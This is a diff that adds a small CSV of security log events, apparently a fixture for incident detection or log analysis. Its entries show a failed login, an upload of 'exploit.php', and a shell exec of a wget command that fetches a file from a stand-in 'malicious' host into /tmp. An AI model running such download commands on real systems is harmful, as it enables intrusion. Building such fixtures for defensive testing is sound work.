@@ -1,0 +1,4 @@
+timestamp,source,event,detail
+2026-10-07T12:00:00Z,auth.log,failed_login,username=alice
+2026-10-07T12:02:00Z,web_access,upload,filename=exploit.php
+2026-10-07T12:03:00Z,process,exec,cmd=/bin/sh -c 'wget http://malicious/x -O /tmp/x'
